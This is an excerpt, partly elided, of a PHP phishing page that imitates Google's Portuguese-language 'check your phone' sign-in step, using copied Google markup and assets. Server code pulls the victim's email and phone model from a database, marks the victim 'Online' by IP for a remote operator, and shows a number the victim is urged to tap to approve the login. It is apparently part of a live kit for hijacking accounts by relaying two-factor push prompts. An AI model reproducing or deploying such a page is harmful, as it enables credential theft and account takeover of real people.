...
$modelo = $row_infio['celular_autenticar'];

$email = $row_infio['usuario'];
$tempo = time();
$atualiza = mysqli_query(DBCOnnect(), "UPDATE infos SET tempo='$tempo', status='Online', statusremote='Cliente online na notificação' WHERE ip='$ip'");
...
<body id="yDmH0d" class="nyoS7c NhGkGb EIlDfe" jscontroller="Uas9Hd"
   ...
   <div
      style="background-color:#FFF !important; min-height: 100px; min-width: 390px; min-height: 470px; padding: 0 !important; margin: 0 !important"
                        ...
                        <div class="DRS7Fe bxPAYd k6Zj8d" jsname="lr9nlf" jscontroller="Z3Buzf" jsshadow=""
                           ...
                           <div jsname="paFcre">
                              <div class="jXeDnc " jsname="tJHJj" jscontroller="S9352b"
                                 ...
                                 <h1 class="ahT6S " data-a11y-title-piece="" id="headingText" jsname="r4nke"><span
                                       jsslot="" _msthash="179478" _msttexthash="402844"></span></h1>
                                 ...
                                 <div class="aCayab">
                                    <div jscontroller="IIfQad"
                                       ...
                                       <div jsname="fmcmS" class="KTeGk" id="profileIdentifier" _msthash="346567"
                           ...
                           <div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
                              <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                                 <div class="WEQkZc">
                                    ...
                                    <section class="aTzEhb  VJ78Hc S7S4N" jscontroller="r27uIe" jsname="wsPcPe"
                                             jsshadow="">
                                             <header class="IdEPtc" jsname="tJHJj">
                                                <figure class="UWVyoc" jsname="Ayj0Lb" aria-hidden="true"
                                                   data-illustration="authzenHiddenPin">
                                                   <div class="B6L7ke" jsname="bsPbBb">
                                                      <div class="p17Urb"></div><img
                                                         src="https://ssl.gstatic.com/accounts/embedded/signin_googleapp_pulldown.gif"
                                                         class="xh7Wmd TrZEUc" aria-hidden="true" alt="">
                                                   </div>
                                                </figure>
                                                <div class="L9iFZc" role="presentation" jsname="NjaE2c">
                                                   <h2 class="kV95Wc TrZEUc"><span jsslot="" jsname="Ud7fr"><span
                                                            jsname="BCqkPb"><span data-i18n="email.gmail.app.title">Verifique o seu</span> <?php
                                                            echo $modelo
                                                         ?></span></span></h2>
                                             ...
                                             <div class="CxRgyd" jsname="MZArnb">
                                                <div jsslot="">
                                                   <div class="PrDSKc" jsname="NhJ5Dd"><span data-i18n="email.gmail.app.text">Puxe para baixo a barra de notificação
                                                      e toque na notificação de entrada. Tocar <strong>Sim</strong>, então
                                                      tocar <strong><?=$celular?></strong>no seu telefone para fazer login.</span><span
                                                         class="Q1P0F" jscontroller="ilZBgf" jsshadow="" jsaction="">
                                                         <figure class="jqXkZd UQ5Caf"><samp class="fD1Pid"
                                                               jsname="feLNVc"><?=$celular?></samp></figure>
                                                      </span></div>
                                                   <div class="PrDSKc"></div><input type="hidden" name="token"
                                                      value="authzenToken" jsname="iFpmR" jscontroller="QCqtlc">
                                                </div>
                                             </div>
                                          </section>
                                    </span>
